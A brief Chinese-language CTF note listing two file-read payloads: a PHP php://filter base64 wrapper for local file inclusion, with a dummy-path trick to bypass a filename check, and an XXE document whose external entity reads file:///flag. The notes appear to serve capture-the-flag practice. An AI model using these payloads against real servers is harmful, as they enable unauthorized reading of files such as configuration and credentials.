1.文件包含漏洞利用PHP伪协议读取flag:

**php://filter:/read=convert.base64-encode/resource=flag.php**

读取过程中可以添加无效路径来满足路径中必须包含指定字符串的要求(例如**payload:/index.php?file=php://filter/emoji/read=convert.base64-encode/resource=index**)

2.XXE利用**file://**协议读取flag:

```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE diary[<!ENTITY content SYSTEM "file:///flag" >]>#引入了一个外部实体,在使用这个外部实体的值时,会将外部实体的值输出,也就是在靶机上读取"file:///flag"的值
<diary>
    <date>%s</date>
    <feeling>%s</feeling>
    <content>&content;</content>#调用了这个外部实体(注意有分号)
</diary>
```

